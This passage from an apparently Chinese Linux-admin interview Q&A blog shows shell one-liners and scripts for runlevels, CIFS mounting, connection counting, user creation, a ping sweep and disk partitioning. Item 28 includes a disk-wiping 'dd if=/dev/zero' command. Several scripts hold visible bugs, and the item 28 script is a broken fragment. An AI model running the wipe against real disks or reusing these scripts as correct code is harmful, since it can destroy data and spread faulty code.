title="4、描述Linux运行级别0-6的各自含义"></a>4、描述Linux运行级别0-6的各自含义</h2><p>0：关机模式</p><p>1：单用户模式&lt;==破解root密码</p><p>2：无网络支持的多用户模式</p><p>3：有网络支持的多用户模式（文本模式，工作中最常用的模式）</p><p>4：保留，未使用</p><p>5：有网络支持的X-windows支持多用户模式（桌面）</p><p>6: 重新引导系统，即重启</p><h2 id="5、Linux如何挂在windows下的共享目录"><a href="#5、Linux如何挂在windows下的共享目录" class="headerlink" title="5、Linux如何挂在windows下的共享目录"></a><strong>5、Linux如何挂在windows下的共享目录</strong></h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mount.cifs <span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.3</span><span class="hljs-regexp">/server /m</span>nt/server -o user=administrator,pass=<span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><p>Linux 下的server需要自己手动建一个 后面的user与pass 是windows主机的账号和密码 注意空格 和逗号。</p><h2 id="6、查看http的并发请求数与其TCP连接状态"><a href="#6、查看http的并发请求数与其TCP连接状态" class="headerlink" title="6、查看http的并发请求数与其TCP连接状态"></a><strong>6、查看http的并发请求数与其TCP连接状态</strong></h2><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">netstat -n | awk &#x27;/<span class="hljs-symbol">^tcp</span>/ &#123;++b[<span class="hljs-built_in">$NF</span>]&#125; END &#123;<span class="hljs-keyword">for</span>(a in b) <span class="hljs-keyword">print</span> a, b[a]&#125;&#x27;<br></code></pre></td></tr></table></figure><p>还有ulimit -n 查看linux系统打开最大的文件描述符，这里默认1024，不修改这里web服务器修改再大也没用。若要用就修改很几个办法，这里说其中一个：</p><p>修改/etc/security/limits.conf</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">* </span>soft nofile 10240<br><span class="hljs-bullet">* </span>hard nofile 10240<br></code></pre></td></tr></table></figure><h2 id="7、用tcpdump嗅探80端口的访问看看谁最高"><a href="#7、用tcpdump嗅探80端口的访问看看谁最高" class="headerlink" title="7、用tcpdump嗅探80端口的访问看看谁最高"></a><strong>7、用tcpdump嗅探80端口的访问看看谁最高</strong></h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcpdump</span> -i eth0 -tnn dst port <span class="hljs-number">80</span> -c <span class="hljs-number">1000</span> | awk -F<span class="hljs-string">&quot;.&quot;</span> &#x27;&#123;print $<span class="hljs-number">1</span><span class="hljs-string">&quot;.&quot;</span>$<span class="hljs-number">2</span><span class="hljs-string">&quot;.&quot;</span>$<span class="hljs-number">3</span><span class="hljs-string">&quot;.&quot;</span>$<span class="hljs-number">4</span>&#125;&#x27; | sort | uniq -c | sort -nr |head -<span class="hljs-number">5</span>&amp;nbsp;<br></code></pre></td></tr></table></figure><h2 id="8、查看-var-log目录下文件数"><a href="#8、查看-var-log目录下文件数" class="headerlink" title="8、查看/var/log目录下文件数"></a><strong>8、查看/var/log目录下文件数</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> /var/log/ -lR| grep <span class="hljs-string">&quot;^-&quot;</span> |<span class="hljs-built_in">wc</span> -l<br></code></pre></td></tr></table></figure><h2 id="9、查看当前系统每个IP的连接数"><a href="#9、查看当前系统每个IP的连接数" class="headerlink" title="9、查看当前系统每个IP的连接数"></a><strong>9、查看当前系统每个IP的连接数</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -n | awk <span class="hljs-string">&#x27;/^tcp/ &#123;print $5&#125;&#x27;</span>| awk -F: <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -rn<br></code></pre></td></tr></table></figure><h2 id="10、shell下32位随机密码生成"><a href="#10、shell下32位随机密码生成" class="headerlink" title="10、shell下32位随机密码生成"></a><strong>10、shell下32位随机密码生成</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /dev/urandom | <span class="hljs-built_in">head</span> -1 | <span class="hljs-built_in">md5sum</span> | <span class="hljs-built_in">head</span> -c 32 &gt;&gt; /pass<br></code></pre></td></tr></table></figure><p>将生成的32位随机数 保存到/pass文件里了</p><h2 id="11、统计出apache的access-log中访问量最多的5个IP"><a href="#11、统计出apache的access-log中访问量最多的5个IP" class="headerlink" title="11、统计出apache的access.log中访问量最多的5个IP"></a><strong>11、统计出apache的access.log中访问量最多的5个IP</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access_log | awk  <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -n -r | <span class="hljs-built_in">head</span> -5<br></code></pre></td></tr></table></figure><h2 id="12、如何查看二进制文件的内容"><a href="#12、如何查看二进制文件的内容" class="headerlink" title="12、如何查看二进制文件的内容"></a><strong>12、如何查看二进制文件的内容</strong></h2><p>我们一般通过hexdump命令 来查看二进制文件的内容。</p><p>hexdump -C XXX(文件名) -C是参数 不同的参数有不同的意义</p><p>-C  是比较规范的 十六进制和ASCII码显示</p><p>-c  是单字节字符显示</p><p>-b  单字节八进制显示</p><p>-o  是双字节八进制显示</p><p>-d  是双字节十进制显示</p><p>-x  是双字节十六进制显示</p><p>等等等等</p><h2 id="13、ps-aux-中的VSZ代表什么意思，RSS代表什么意思"><a href="#13、ps-aux-中的VSZ代表什么意思，RSS代表什么意思" class="headerlink" title="13、ps aux 中的VSZ代表什么意思，RSS代表什么意思"></a><strong>13、ps aux 中的VSZ代表什么意思，RSS代表什么意思</strong></h2><p>VSZ:虚拟内存集,进程占用的虚拟内存空间</p><p>RSS:物理内存集,进程战用实际物理内存空间</p><h2 id="14、检测并修复-dev-hda5"><a href="#14、检测并修复-dev-hda5" class="headerlink" title="14、检测并修复/dev/hda5"></a>14、<strong>检测并修复/dev/hda5</strong></h2><p>fsck用来检查和维护不一致的文件系统。若系统掉电或磁盘发生问题，可利用fsck命令对文件系统进行检查,</p><h2 id="15、符号链接与硬链接的区别"><a href="#15、符号链接与硬链接的区别" class="headerlink" title="15、符号链接与硬链接的区别"></a><strong>15、符号链接与硬链接的区别</strong></h2><p>我们可以把符号链接，也就是软连接 当做是 windows系统里的 快捷方式。</p><p>硬链接 就好像是 又复制了一份.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ln</span> <span class="hljs-number">3</span>.txt <span class="hljs-number">4</span>.txt   这是硬链接，相当于复制，不可以跨分区，但修改<span class="hljs-number">3</span>,<span class="hljs-number">4</span>会跟着变，若删除<span class="hljs-number">3</span>,<span class="hljs-number">4</span>不受任何影响。<br><br><span class="hljs-attribute">ln</span> -s <span class="hljs-number">3</span>.txt <span class="hljs-number">4</span>.txt  这是软连接，相当于快捷方式。修改<span class="hljs-number">4</span>,<span class="hljs-number">3</span>也会跟着变，若删除<span class="hljs-number">3</span>,<span class="hljs-number">4</span>就坏掉了。不可以用了。<br></code></pre></td></tr></table></figure><h2 id="16、保存当前磁盘分区的分区表"><a href="#16、保存当前磁盘分区的分区表" class="headerlink" title="16、保存当前磁盘分区的分区表"></a><strong>16、保存当前磁盘分区的分区表</strong></h2><p>dd 命令是以个强大的命令，在复制的同时进行转换</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">dd <span class="hljs-attribute">if</span>=/dev/sda <span class="hljs-attribute">of</span>=./mbr.txt <span class="hljs-attribute">bs</span>=1 <span class="hljs-attribute">count</span>=512<br></code></pre></td></tr></table></figure><h2 id="17、手动安装grub"><a href="#17、手动安装grub" class="headerlink" title="17、手动安装grub"></a>17、<strong>手动安装grub</strong></h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">grub-install <span class="hljs-regexp">/dev/</span>sda<br></code></pre></td></tr></table></figure><h2 id="18、修改内核参数"><a href="#18、修改内核参数" class="headerlink" title="18、修改内核参数"></a><strong>18、修改内核参数</strong></h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/</span>sysctl.conf  这里修改参数<br>   sysctl -p  刷新后可用<br></code></pre></td></tr></table></figure><h2 id="19、在1-39内取随机数"><a href="#19、在1-39内取随机数" class="headerlink" title="19、在1-39内取随机数"></a><strong>19、在1-39内取随机数</strong></h2><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">expr $[$RANDOM%39] + <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>RANDOM 随机数</p><p>%39 取余数 范围 0-38</p><h2 id="20、限制apache每秒新建连接数为1，峰值为3"><a href="#20、限制apache每秒新建连接数为1，峰值为3" class="headerlink" title="20、限制apache每秒新建连接数为1，峰值为3"></a>20、<strong>限制apache每秒新建连接数为1，峰值为3</strong></h2><p>每秒新建连接数 一般都是由防火墙来做，apache本身好像无法设置每秒新建连接数，只能设置最大连接：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">iptables -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -d <span class="hljs-number">172.16</span>.<span class="hljs-number">100.1</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">80</span> -m limit <span class="hljs-attr">--limit</span> <span class="hljs-number">1</span>/second  -j ACCEPT<br></code></pre></td></tr></table></figure><p>硬件防火墙设置更简单，有界面化，可以直接填写数字。。。</p><p>最大连接 apache本身可以设置</p><p>MaxClients 3 ,修改apache最大连接 前提还是要修改系统默认tcp连接数。我博客里也说了，这就不说了。</p><h2 id="21、FTP的主动模式和被动模式"><a href="#21、FTP的主动模式和被动模式" class="headerlink" title="21、FTP的主动模式和被动模式"></a>21、<strong>FTP的主动模式和被动模式</strong></h2><p>FTP协议有两种工作方式：PORT方式和PASV方式，中文意思为主动式和被动式。</p><p>PORT（主动）方式的连接过程是：客户端向服务器的FTP端口（默认是21）发送连接请 求，服务器接受连接，建立一条命令链路。当需要传送数据时，客户端在命令链路上用PORT 命令告诉服务器：“我打开了XX端口，你过来连接我”。于是服务器从20端口向客户端的 XX端口发送连接请求，建立一条数据链路来传送数据。</p><p>PASV（被动）方式的连接过程是：客户端向服务器的FTP端口（默认是21）发送连接请 求，服务器接受连接，建立一条命令链路。当需要传送数据时，服务器在命令链路上用PASV 命令告诉客户端：“我打开了XX端口，你过来连接我”。于是客户端向服务器的XX端口 发送连接请求，建立一条数据链路来传送数据。</p><p>从上面可以看出，两种方式的命令链路连接方法是一样的，而数据链路的建立方法就完 全不同。</p><h2 id="22、显示-etc-inittab中以-开头，且后面跟了一个或者多个空白字符，而后又跟了任意非空白字符的行"><a href="#22、显示-etc-inittab中以-开头，且后面跟了一个或者多个空白字符，而后又跟了任意非空白字符的行" class="headerlink" title="22、显示/etc/inittab中以#开头，且后面跟了一个或者多个空白字符，而后又跟了任意非空白字符的行"></a>22、<strong>显示/etc/inittab中以#开头，且后面跟了一个或者多个空白字符，而后又跟了任意非空白字符的行</strong></h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;^# \&#123;1,\&#125;[^ ]&quot;</span> <span class="hljs-regexp">/etc/i</span>nittab<br></code></pre></td></tr></table></figure><h2 id="23、显示-etc-inittab中包含了-一个数字-即两个冒号中间一个数字-的行"><a href="#23、显示-etc-inittab中包含了-一个数字-即两个冒号中间一个数字-的行" class="headerlink" title="23、显示/etc/inittab中包含了:一个数字:(即两个冒号中间一个数字)的行"></a>23、显示/etc/inittab中包含了:一个数字:(即两个冒号中间一个数字)的行</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;\:[0-9]\&#123;1\&#125;\:&quot;</span> <span class="hljs-regexp">/etc/i</span>nittab<br></code></pre></td></tr></table></figure><h2 id="24、怎么把脚本添加到系统服务里，即用service来调用"><a href="#24、怎么把脚本添加到系统服务里，即用service来调用" class="headerlink" title="24、怎么把脚本添加到系统服务里，即用service来调用"></a>24、<strong>怎么把脚本添加到系统服务里，即用service来调用</strong></h2><p>在脚本里加入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment"># chkconfig: 345 85 15</span><br><span class="hljs-comment"># description: httpd</span><br></code></pre></td></tr></table></figure><p>然后保存</p><p>chkconfig httpd –add  创建系统服务</p><p>现在就可以使用service 来 start or restart</p><h2 id="25、写一个脚本，实现批量添加20个用户，用户名为user01-20，密码为user后面跟5个随机字符"><a href="#25、写一个脚本，实现批量添加20个用户，用户名为user01-20，密码为user后面跟5个随机字符" class="headerlink" title="25、写一个脚本，实现批量添加20个用户，用户名为user01-20，密码为user后面跟5个随机字符"></a><strong>25、写一个脚本，实现批量添加20个用户，用户名为user01-20，密码为user后面跟5个随机字符</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment">#description: useradd</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `<span class="hljs-built_in">seq</span> -f<span class="hljs-string">&quot;%02g&quot;</span> 1 20`;<span class="hljs-keyword">do</span><br>useradd user<span class="hljs-variable">$i</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;user<span class="hljs-variable">$i</span>-`echo <span class="hljs-variable">$RANDOM</span>|md5sum|cut -c 1-5`&quot;</span>|passwd –stdinuser<span class="hljs-variable">$i</span> &gt;/dev/null 2&gt;&amp;1<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h2 id="26、写一个脚本，实现判断192-168-1-0-24网络里，当前在线的IP有哪些，能ping通则认为在线"><a href="#26、写一个脚本，实现判断192-168-1-0-24网络里，当前在线的IP有哪些，能ping通则认为在线" class="headerlink" title="26、写一个脚本，实现判断192.168.1.0/24网络里，当前在线的IP有哪些，能ping通则认为在线"></a><strong>26、写一个脚本，实现判断192.168.1.0/24网络里，当前在线的IP有哪些，能ping通则认为在线</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> `<span class="hljs-built_in">seq</span> 1 255`<br>  <span class="hljs-keyword">do</span><br>    &#123;<br>     ping -c 1 192.168.1.<span class="hljs-variable">$ip</span> &gt; /dev/null 2&gt;&amp;1<br>     <span class="hljs-keyword">if</span> [ $? -eq 0 ]; <span class="hljs-keyword">then</span><br>          <span class="hljs-built_in">echo</span> 192.168.1.<span class="hljs-variable">$ip</span> UP<br>     <span class="hljs-keyword">else</span><br>          <span class="hljs-built_in">echo</span> 192.168.1.<span class="hljs-variable">$ip</span> DOWN<br>     <span class="hljs-keyword">fi</span><br>   &#125;&amp;<br><span class="hljs-keyword">done</span><br><span class="hljs-built_in">wait</span><br></code></pre></td></tr></table></figure><h2 id="26、写一个脚本，判断一个指定的脚本是否是语法错误；如果有错误，则提醒用户键入Q或者q无视错误并退出其它任何键可以通过vim打开这个指定的脚本"><a href="#26、写一个脚本，判断一个指定的脚本是否是语法错误；如果有错误，则提醒用户键入Q或者q无视错误并退出其它任何键可以通过vim打开这个指定的脚本" class="headerlink" title="26、写一个脚本，判断一个指定的脚本是否是语法错误；如果有错误，则提醒用户键入Q或者q无视错误并退出其它任何键可以通过vim打开这个指定的脚本"></a>26、<strong>写一个脚本，判断一个指定的脚本是否是语法错误；如果有错误，则提醒用户键入Q或者q无视错误并退出其它任何键可以通过vim打开这个指定的脚本</strong></h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs awk">[root@localhost  tmp]<span class="hljs-comment"># cat checksh.sh</span><br> <span class="hljs-comment">#!/bin/bash</span><br> read -p <span class="hljs-string">&quot;please input check script-&gt; &quot;</span> file<br> <span class="hljs-keyword">if</span> [ -f <span class="hljs-variable">$file</span> ]; then<br>    sh -n <span class="hljs-variable">$file</span> &gt; <span class="hljs-regexp">/dev/</span>null <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> [ $? -ne <span class="hljs-number">0</span> ]; then<br>        read -p <span class="hljs-string">&quot;You input $file syntax error,[Type q to exit or Type vim to  edit]&quot;</span> answer<br>        case <span class="hljs-variable">$answer</span> <span class="hljs-keyword">in</span><br>        q | Q)<br>           <span class="hljs-keyword">exit</span> <span class="hljs-number">0</span><br>           ;;<br>        vim )<br>           vim <span class="hljs-variable">$file</span><br>           ;;<br>        *）<br>         <span class="hljs-keyword">exit</span> <span class="hljs-number">0</span><br>         ;;<br>        esac<br>   fi<br> <span class="hljs-keyword">else</span><br>    echo <span class="hljs-string">&quot;$file not exist&quot;</span><br>    <span class="hljs-keyword">exit</span> <span class="hljs-number">1</span><br> fi<br></code></pre></td></tr></table></figure><h2 id="27、写一个脚本：-27包括3个小题"><a href="#27、写一个脚本：-27包括3个小题" class="headerlink" title="27、写一个脚本：(27包括3个小题)"></a><strong>27、写一个脚本：(27包括3个小题)</strong></h2><p>1、创建一个函数，能接受两个参数：</p><p>1)第一个参数为URL，即可下载的文件；第二个参数为目录，即下载后保存的位置；</p><p>2)如果用户给的目录不存在，则提示用户是否创建；如果创建就继续执行，否则，函数返回一个51的错误值给调用脚本；</p><p>3)如果给的目录存在，则下载文件；下载命令执行结束后测试文件下载成功与否；如果成功，则返回0给调用脚本，否则，返回52给调用脚本；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost tmp]<span class="hljs-comment"># cat downfile.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br>url=<span class="hljs-variable">$1</span><br><span class="hljs-built_in">dir</span>=<span class="hljs-variable">$2</span><br><span class="hljs-function"><span class="hljs-title">download</span></span>()<br>  &#123;<br>    <span class="hljs-built_in">cd</span> <span class="hljs-variable">$dir</span> &gt;&gt; /dev/null 2&gt;&amp;1<br>    <span class="hljs-keyword">if</span> [ $? -ne 0 ];<span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">read</span> -p <span class="hljs-string">&quot;<span class="hljs-variable">$dir</span> No such file or directory,create?(y/n)&quot;</span> answer<br>        <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$answer</span>&quot;</span> == <span class="hljs-string">&quot;y&quot;</span> ];<span class="hljs-keyword">then</span><br>            <span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$dir</span><br>            <span class="hljs-built_in">cd</span> <span class="hljs-variable">$dir</span><br>            wget <span class="hljs-variable">$url</span> 1&gt; /dev/null 2&gt;&amp;1<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;51&quot;</span><br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">if</span> [ $? -ne 0 ]; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;52&quot;</span><br>    <span class="hljs-keyword">fi</span><br>&#125;<br>download <span class="hljs-variable">$url</span> <span class="hljs-variable">$dir</span><br><span class="hljs-built_in">echo</span> $?<br></code></pre></td></tr></table></figure><h2 id="28、写一个脚本：（28包括2个小题）"><a href="#28、写一个脚本：（28包括2个小题）" class="headerlink" title="28、写一个脚本：（28包括2个小题）"></a><strong>28、写一个脚本：（28包括2个小题）</strong></h2><p>1、创建一个函数，可以接受一个磁盘设备路径（如/dev/sdb）作为参数;在真正开始后面步骤之前提醒用户有危险，并让用户选择是否继续；而后将此磁盘设备上的所有分区清空（提示，使用命令dd if=/dev/zero of=/dev/sdb bs=512 count=1实现，注意其中的设备路径不要写错了；</p><p>如果此步骤失败，返回67给主程序；</p><p>接着在此磁盘设备上创建两个主分区，一个大小为100M，一个大小为1G；如果此步骤失败，返回68给主程序；<br>格式化此两分区，文件系统类型为ext3；如果此步骤失败，返回69给主程序；</p><p>如果上述过程都正常，返回0给主程序；</p><p>2、调用此函数；并通过接收函数执行的返回值来判断其执行情况，并将信息显示出来；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">local</span> Darray=(`<span class="hljs-built_in">ls</span> /dev/sd[a-z]`)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;Darray&#125;</span>;<span class="hljs-keyword">do</span><br>  [[ <span class="hljs-string">&quot;<span class="hljs-variable">$i</span>&quot;</span> == <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> ]] &amp;&amp; Sd=<span class="hljs-variable">$i</span> &amp;&amp;<span class="hljs-built_in">break</span><br><span class="hljs-keyword">done</span><br>  <span class="hljs-keyword">else</span><br>  return66<br>  <span class="hljs-keyword">fi</span><br><span class="hljs-comment">#当匹配成功，进入选择，告诉用户，是否继续，输错的话进入无限循环，当用户选择Y,则清空目标分区，且跳出while循环</span><br><span class="hljs-keyword">while</span> :;<span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">read</span> -p <span class="hljs-string">&quot;Warning!!!This operation will clean <span class="hljs-variable">$Sd</span> data.Next=y,Quit=n [y|n]:&quot;</span> Choice<br>    <span class="hljs-keyword">case</span> <span class="hljs-variable">$Choice</span> <span class="hljs-keyword">in</span><br>y)<br>   <span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=<span class="hljs-variable">$Sd</span> bs=512 count=1 &amp;&gt; /dev/null &amp;&amp;<span class="hljs-built_in">break</span> || <span class="hljs-built_in">return</span> 67 ;;<br>n)<br>   <span class="hljs-built_in">exit</span> 88 ;;<br>*)<br>   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Invalid choice,please choice again.&quot;</span> ;;<br><span class="hljs-keyword">esac</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>#使用echo传递给fdisk进行分区，如果此命令失败，则跳转出去，错误值68，需要注意的是，有时候这个返回值很诡异，笔者之前成功与否都是返回的1，后来重启之后，就好了，如果慎重的话，可以对创建的分区，进行判断，不过就需要使用其他工具截取相关字段了，虽有些小麻烦，但无大碍</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">echo</span><span class="hljs-operator">-</span><span class="hljs-variable">e</span> <span class="hljs-string">&quot;n<span class="hljs-char escape_">\n</span>p<span class="hljs-char escape_">\n</span>1<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>+100M<span class="hljs-char escape_">\n</span>n<span class="hljs-char escape_">\n</span>p<span class="hljs-char escape_">\n</span>2<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>+1024M<span class="hljs-char escape_">\n</span>w<span class="hljs-char escape_">\n</span>&quot;</span><span class="hljs-operator">|</span><span class="hljs-variable">fdisk</span> /<span class="hljs-variable">dev</span>/<span class="hljs-variable">sdb</span><span class="hljs-operator">&amp;</span><span class="hljs-operator">&gt;</span> /<span class="hljs-variable">dev</span>/<span class="hljs-literal">null</span> <span class="hljs-operator">||</span> <span class="hljs-keyword">return</span> <span class="hljs-number">68</span><br></code></pre></td></tr></table></figure><p>#格式化之前，让内核重新读取磁盘分区表，值得注意的是，有的系统版本，使用partprobe无效，譬如笔者的环境是rhel5.8，而rhel6.0以后，这个命令就很危险了，而使用partx -a /dev/sdb则效果更好…此项需慎重，如果格式化失败，则告知把失败的分区定义成变量，且跳出函数，并带出错误值69</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">`partprobe`<br>Part=`fdisk -l /dev/<span class="hljs-variable">$Sd</span>|<span class="hljs-built_in">tail</span> -2|<span class="hljs-built_in">cut</span> -d” ” -f1`<br><span class="hljs-keyword">for</span> M <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;Part&#125;</span>;<span class="hljs-keyword">do</span><br>   mke2fs -j <span class="hljs-variable">$M</span> &amp;&gt; /dev/null &amp;&amp; ErrorPart=<span class="hljs-variable">$M</span> &amp;&amp;<span class="hljs-built_in">return</span> 69<br><span class="hljs-keyword">done</span><br>  <span class="hljs-built_in">return</span> 0<br>&#125;<br></code></pre></td></tr></table></figure><p>#下面代码，调用函数，接收函数返回值，根据返回值进行判断哪里出错。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">Disk_Mod <span class="hljs-variable">$1</span><br>Res=$?<br>[ <span class="hljs-variable">$Res</span>-eq <span class="hljs-number">0</span> ] &amp;&amp; <span class="hljs-keyword">exit</span> <span class="hljs-number">0</span><br>[ <span class="hljs-variable">$Res</span>-eq <span class="hljs-number">66</span> ] &amp;&amp; echo <span class="hljs-string">&quot;Error! Invalid input.&quot;</span><br>[ <span class="hljs-variable">$Res</span>-eq <span class="hljs-number">67</span> ] &amp;&amp; echo <span class="hljs-string">&quot;Error! Command -&gt; dd &lt;- Faild.&quot;</span><br>[ <span class="hljs-variable">$Res</span>-eq <span class="hljs-number">68</span> ] &amp;&amp; echo <span class="hljs-string">&quot;Error! Command -&gt; fdisk &lt;- Faild.&quot;</span><br>[ <span class="hljs-variable">$Res</span>-eq <span class="hljs-number">69</span> ] &amp;&amp; echo <span class="hljs-string">&quot;Error! Command -&gt; mke2fs &lt;- Faild.&quot;</span><br></code></pre></td></tr></table></figure><h2 id="29、统计指定aaa目录的文件大于1M的txt文件个数"><a href="#29、统计指定aaa目录的文件大于1M的txt文件个数" class="headerlink" title="29、统计指定aaa目录的文件大于1M的txt文件个数"></a>29、统计指定aaa目录的文件大于1M的txt文件个数</h2><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[root<span class="hljs-title">@tiejiang</span> ~]# find aaa -name <span class="hljs-string">&quot;*.txt&quot;</span> -<span class="hljs-keyword">type</span> f -size <span class="hljs-number">+1024000</span><span class="hljs-keyword">c</span> | wc -l<br></code></pre></td></tr></table></figure><h2 